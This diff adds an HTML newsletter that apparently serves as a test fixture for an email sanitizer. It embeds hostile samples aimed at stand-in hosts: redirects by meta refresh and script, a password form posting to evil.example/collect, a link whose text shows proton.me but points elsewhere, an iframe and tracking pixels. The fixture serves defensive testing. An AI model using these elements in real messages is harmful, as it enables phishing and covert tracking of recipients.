@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0; url=https://evil.example/refresh">
+<link rel="stylesheet" href="https://tracker.example/style.css">
+<style>
+  @import url("https://tracker.example/import.css");
+  @font-face { font-family: Brand; src: url("https://fonts.example/brand.woff2"); }
+  body { margin:0; background:#eef1f5; font-family: Helvetica, Arial, sans-serif; color:#222; }
+  .btn { display:inline-block; background:#6d4aff; color:#fff !important; padding:12px 22px; border-radius:6px; text-decoration:none; font-weight:bold; }
+  .muted { color:#7a8190; font-size:12px; }
+  h1 { font-family: Brand, Georgia, serif; font-size:28px; margin:0 0 8px; }
+  @media (max-width: 600px) { .col { display:block !important; width:100% !important; } }
+</style>
+<script>document.location = "https://evil.example/script";</script>
+</head>
+<body style="background-image:url('https://tracker.example/bg.png')">
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0" bgcolor="#eef1f5">
+ <tr><td align="center" style="padding:24px 12px">
+  <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:10px;overflow:hidden">
+   <tr><td style="background:#1c1340;padding:20px 28px;color:#fff;font-size:20px;font-weight:bold">
+     <img src="https://cdn.example/logo.png" width="32" height="32" alt="[logo]" style="vertical-align:middle"> Acme Weekly
+   </td></tr>
+   <tr><td style="padding:28px">
+     <h1>Your October roundup</h1>
+     <p style="line-height:1.5">Here's what happened this month. We shipped <b>three</b> new features, fixed <i>forty</i> bugs, and wrote a <a href="https://acme.example/blog">blog post</a> about it.</p>
+     <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:18px 0">
+      <tr>
+       <td class="col" width="50%" valign="top" style="padding-right:10px">
+         <img src="cid:chart@acme" width="260" alt="[chart]" style="display:block;border-radius:6px">
+         <p class="muted">Inline image from a cid: part.</p>
+       </td>
+       <td class="col" width="50%" valign="top" style="padding-left:10px">
+         <img src="https://cdn.example/hero.jpg" width="260" height="160" alt="[remote hero image]" style="display:block;background:#ddd;border-radius:6px">
+         <p class="muted">Remote image: must be blocked.</p>
+       </td>
+      </tr>
+     </table>
+     <p><a class="btn" href="https://acme.example/account">View your account</a></p>
+     <p>Watch out: <a href="https://evil.example/login">https://proton.me/login</a> (text and target differ).</p>
+     <form action="https://evil.example/collect" method="post">
+       <input name="password" type="password" placeholder="Password"> <button>Sign in</button>
+     </form>
+     <blockquote style="border-left:3px solid #ccc;margin:16px 0;padding-left:12px;color:#555">On Friday, Ada wrote:<br>Quoted reply text.</blockquote>
+     <ul><li>One</li><li>Two</li></ul>
+     <iframe src="https://evil.example/frame" width="200" height="60"></iframe>
+   </td></tr>
+   <tr><td style="padding:16px 28px;background:#f6f7f9" class="muted">
+     You're receiving this because you signed up. <a href="https://acme.example/unsubscribe">Unsubscribe</a>.
+   </td></tr>
+  </table>
+ </td></tr>
+</table>
+<img src="https://tracker.example/open.gif?u=12345" width="1" height="1" alt="">
+</body></html>
